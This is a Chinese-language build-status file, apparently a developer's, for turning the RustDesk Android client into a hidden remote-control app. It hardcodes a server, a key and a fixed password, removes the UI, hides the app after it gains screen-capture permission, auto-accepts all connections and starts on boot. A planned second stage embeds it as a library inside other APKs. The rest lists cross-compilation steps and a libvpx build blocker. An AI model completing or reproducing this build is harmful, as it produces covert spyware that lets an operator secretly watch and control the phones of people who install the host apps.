# RustDesk 定制版 - 构建状态说明

更新时间：2026-05-14

---

## 目标

将 RustDesk Android 客户端改造为**静默远控 APK**：
- 硬编码固定服务器/密码，无需用户配置
- 去除 Flutter UI，后台静默运行
- 自动接受所有连接请求
- 开机自启

最终目标：阶段二改造为 AAR 库，嵌入其他 APK。

---

## 固化参数

| 参数 | 值 |
|------|-----|
| 密码 | `612345` |
| ID 服务器 | `rustdeskserver1.softtesta.com:21116` |
| 中继服务器 | `rustdeskserver1.softtesta.com:21117` |
| 公钥 | `I9K8i6VwPI+qLW3g07Y3MkNEPjWGHpQHMaYUeP1HQLw=` |

---

## 已完成的代码修改

### 1. Rust 后端 (`src/flutter_ffi.rs`)
- `Java_ffi_FFI_startServer` 函数中硬编码了服务器地址、中继地址、公钥、永久密码
- 服务启动时自动写入配置，无需用户操作

### 2. Android 服务 (`flutter/android/app/src/main/kotlin/com/carriez/flutter_hbb/MainService.kt`)
- 修改连接授权逻辑：**自动接受所有连接**，不弹授权提示

### 3. Android 主界面 (`flutter/android/app/src/main/kotlin/com/carriez/flutter_hbb/MainActivity.kt`)
- 完全替换原 Flutter UI Activity
- 新版本：启动后立即申请 MediaProjection 权限，获取后隐藏自身，后台运行

### 4. Android 应用入口 (`flutter/android/app/src/main/kotlin/com/carriez/flutter_hbb/MainApplication.kt`)
- 移除不必要 import
- 强制开启开机自启选项

### 5. Gradle 构建文件
- `flutter/android/app/build.gradle`：移除 Flutter Gradle 插件和 flutter { source } 块
- `flutter/android/settings.gradle`：移除 Flutter SDK 路径和插件加载器

### 6. AndroidManifest.xml
- 移除 Flutter embedding meta-data 标签

### 7. Cargo 配置 (`.cargo/config.toml`)
- 配置 aarch64-linux-android 使用 NDK clang.exe 作为链接器
- API level 30（解决 pthread 兼容问题）

---

## 当前构建状态

**阶段：Rust 交叉编译进行中，尚未完成**

### 已解决的编译问题
- ✅ rustup + Android targets 安装（aarch64-linux-android 等）
- ✅ MSYS2 环境配置（Perl、make、autoconf）
- ✅ NDK 工具链 wrapper 脚本（/usr/local/bin/aarch64-linux-android-*）
- ✅ libsodium 1.0.18 交叉编译完成（位于 `C:\Users\Administrator\android-build\libsodium-android\`）
- ✅ libopus 1.5.2 交叉编译完成（位于 `C:\Users\Administrator\android-build\opus-install\`）
- ✅ LLVM 18 安装（bindgen 需要 libclang.dll）
- ✅ vcpkg-android 假目录结构（`C:\vcpkg-android\installed\arm64-android\`）供 magnum-opus 使用
- ✅ OpenSSL 静态编译（cargo openssl-sys 自动处理）
- ✅ bindgen sysroot 配置（BINDGEN_EXTRA_CLANG_ARGS）

### 当前阻塞问题
- ❌ `libvpx`（VP8/VP9 编解码）未编译 → `scrap` crate 构建失败
  - 错误：`vpx/vp8.h` file not found
  - 需要为 aarch64-linux-android 交叉编译 libvpx

### 下一步
1. 编译 libvpx for arm64-android（用 NDK CMake 或 autoconf）
2. 放入 `C:\vcpkg-android\installed\arm64-android\` 供 scrap/build.rs 找到
3. 完成 `cargo build --target aarch64-linux-android --release`
4. 将生成的 `librustdesk.so` 放入 `flutter/android/app/src/main/jniLibs/arm64-v8a/`
5. 用 Android Studio 或 Gradle 打包最终 APK

---

## 构建环境

| 工具 | 路径/版本 |
|------|----------|
| NDK | r29 (`C:\Users\Administrator\AppData\Local\Android\Sdk\ndk\29.0.14033849`) |
| MSYS2 | `C:\msys64` |
| LLVM | 18.1.8 (`C:\Program Files\LLVM`) |
| Rust target | aarch64-linux-android |
| API level | 30 |
| 构建脚本 | `C:\Users\Administrator\Downloads\build_all.sh` |

---

## 文件结构（关键修改文件）

```
rustdesk-master/
├── src/
│   └── flutter_ffi.rs          ← 硬编码服务器/密码
├── flutter/android/app/
│   ├── build.gradle             ← 移除Flutter依赖
│   └── src/main/
│       ├── AndroidManifest.xml  ← 移除Flutter meta
│       └── kotlin/com/carriez/flutter_hbb/
│           ├── MainActivity.kt  ← 替换为静默Activity
│           ├── MainService.kt   ← 自动接受连接
│           └── MainApplication.kt ← 强制开机自启
├── .cargo/
│   └── config.toml             ← Android NDK linker配置
└── BUILD_STATUS.md             ← 本文件
```
